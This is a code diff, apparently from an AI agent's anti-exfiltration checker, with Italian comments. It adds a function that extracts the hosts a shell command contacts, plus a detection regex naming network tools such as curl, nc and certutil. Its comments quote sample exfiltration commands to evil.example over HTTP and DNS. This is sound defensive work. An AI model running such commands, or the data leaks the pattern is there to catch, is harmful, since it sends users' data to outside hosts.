@@ -830,6 +830,30 @@
     return out;
   }
 
+  // Gli indirizzi a cui un comando si collega (#2293): quelli con lo schema ovunque, e quelli senza (`curl evil.example/?d=…`,
+  // `nslookup dati.evil.example`) dietro un programma di rete. Le shell tolgono `^`, virgolette e backtick (#1072.1).
+  const PROGRAMMI_RETE = /\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod|aria2c|lynx|w3m|links|nc|ncat|netcat|telnet|ssh|scp|sftp|ftp|rsync|http|https|xh|ping|nslookup|dig|host|resolve-dnsname|test-netconnection|start-bitstransfer|certutil|bitsadmin)\b/i;
+  const ESTENSIONI = /^(?:gz|tgz|bz2|xz|zip|tar|7z|rar|json|txt|md|log|csv|xml|html?|js|mjs|ts|py|sh|ps1|bat|exe|msi|dmg|deb|rpm|pdf|png|jpe?g|gif|iso|conf|ini|ya?ml|toml)$/i;
+  const MAX_INDIRIZZI_COMANDO = 50;
+  function indirizziDelComando(action) {
+    const a = action && typeof action === 'object' ? action : {};
+    const cmd = [a.comando, a.command, a.cmd].filter((v) => typeof v === 'string').join('\n').replace(/[\^"'`]/g, '');
+    const out = [];
+    const metti = (u) => { if (out.length < MAX_INDIRIZZI_COMANDO && !out.includes(u)) out.push(u); };
+    const resto = cmd.replace(/\bhttps?:\/\/[^\s<>()|;]+/gi, (m) => { metti(m); return ' '; });
+    if (!PROGRAMMI_RETE.test(resto)) return out;
+    for (const pezzo of resto.split(/[\s<>()|;&,]+/)) {
+      const tok = pezzo.replace(/^-{1,2}[a-z-]*=/i, '').replace(/^@/, '');
+      if (!tok || tok.startsWith('-') || /^[a-z][a-z0-9+.-]*:\/\//i.test(tok)) continue;
+      const m = /^((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+([a-z]{2,63}))(:\d{1,5})?([/?#].*)?$/i.exec(tok);
+      if (!m) continue;
+      const etichette = m[1].split('.').length;
+      if (!m[3] && !m[4] && (etichette < 3 || ESTENSIONI.test(m[2]))) continue;
+      metti(`http://${tok}`);
+    }
+    return out;
+  }
+
   // Il resto del verdetto è l'anti-esfiltrazione di #587: un OK in più, non un blocco.
   function valutaAvvisi(tipo, action, { memoria, azioni, daPagina, parole = '', domanda = '' }, niente) {
     if (tipo === 'NAVIGA' || tipo === 'LEGGI_PAGINA') {
